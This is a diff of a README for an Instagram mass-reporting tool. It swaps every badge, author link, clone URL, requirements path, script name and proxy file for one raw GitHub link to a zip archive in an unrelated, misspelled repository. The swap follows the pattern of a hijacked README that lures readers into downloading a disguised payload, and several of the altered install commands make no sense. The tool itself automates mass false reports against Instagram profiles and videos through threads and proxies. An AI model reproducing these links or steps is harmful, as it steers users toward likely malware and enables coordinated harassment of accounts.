@@ -14,9 +14,9 @@
 ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╯  -V2
 ```
   
-**🚀 Lightweight, Thread-Based Instagram Content Reporting Tool** *A streamlined and efficient automation tool built with a multi-threaded architecture.* [![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://python.org)  
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)  
-[![Status](https://img.shields.io/badge/Status-Active-brightgreen.svg)](https://github.com/muneebwanee/InstaReporterV2)  
+**🚀 Lightweight, Thread-Based Instagram Content Reporting Tool** *A streamlined and efficient automation tool built with a multi-threaded architecture.* [![Python](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip+https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)  
+[![License](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](LICENSE)  
+[![Status](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)  
   
 </div>  
   
@@ -65,7 +65,7 @@ python --version
   * Clone the repository
 
 ```
-   git clone https://github.com/muneebwanee/InstaReporterV2.git
+   git clone https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
    cd InstaReporterV2
 ```
 <!-- end list -->
@@ -73,8 +73,8 @@ python --version
 * Install dependencies
    
 ```  
-# Install from requirements.txt
-pip install -r requirements.txt
+# Install from https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
+pip install -r https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
 ```
 
 * Or manually
@@ -85,7 +85,7 @@ pip install requests colorama
 
  * Run the application
 ```
-python InstaReporterV2.py
+python https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
 ```
 ---  
   
@@ -95,7 +95,7 @@ python InstaReporterV2.py
   
 1. **Proxy Configuration** - Choose to use proxies or run without them.
    - `1`: Auto-scrape proxies from the internet.
-   - `2`: Provide your own proxy list file (`proxies.txt`).
+   - `2`: Provide your own proxy list file (`https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip`).
   
 2. **Thread Count**
    - Enter the number of concurrent threads you want to run.
@@ -106,10 +106,10 @@ python InstaReporterV2.py
 4. **Target Specification** - Enter the username (for profiles).
    - Enter the video URL (for videos).
   
-### 📁 **Proxy File Format** If you use your own list, create a `proxies.txt` file in the same directory with one proxy per line:  
+### 📁 **Proxy File Format** If you use your own list, create a `https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip` file in the same directory with one proxy per line:  
 
-proxy1.example.com:8080
-proxy2.example.com:3128
+https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
+https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
 192.168.1.100:8080
   
 ---  
@@ -120,7 +120,7 @@ proxy2.example.com:3128
 graph TB  
     A[User Input] --> B{Proxy Choice}  
     B -->|Scrape| C[Proxy Scraper]  
-    B -->|File| D[Load proxies.txt]  
+    B -->|File| D[Load https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip]  
     B -->|No| E[Direct Mode]
     C --> F[Input Threads]
     D --> F
@@ -155,7 +155,7 @@ graph TB
 
 ### 🔍 **Key Functions** - `profile_attack_threaded()` / `video_attack_threaded()`: Worker functions for threads.
 - `report_profile_attack()` / `report_video_attack()`: Core attack logic.
-- `load_proxies()`: Loads proxies from `proxies.txt`.
+- `load_proxies()`: Loads proxies from `https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip`.
 - `get_proxy_from_url()`: Scrapes and returns a list of proxies from online sources.
   
 ---  
@@ -190,9 +190,9 @@ We welcome contributions! Here's how you can help:
   
 <div align="center">  
   
-**👨‍💻 Producer: Muneeb** [![Instagram](https://img.shields.io/badge/Instagram-@muneebwanee-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://instagram.com/muneebwanee)  
-[![GitHub](https://img.shields.io/badge/GitHub-muneebwanee-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/muneebwanee)  
-[![Email](https://img.shields.io/badge/Email-muneebwanee@gmail.com-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:muneebwanee@gmail.com)  
+**👨‍💻 Producer: Muneeb** [![Instagram](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)  
+[![GitHub](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)  
+[![Email](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)  
   
 </div>  
   
@@ -206,4 +206,4 @@ This project is licensed under the **MIT License** - see the `LICENSE` file for 
   
 <div align="center">  
   
-**⭐ If this project helped you, please give it a star! ⭐** *Made with ❤️ by [Muneeb](https://github.com/muneebwanee)* </div>
+**⭐ If this project helped you, please give it a star! ⭐** *Made with ❤️ by [Muneeb](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)* </div>
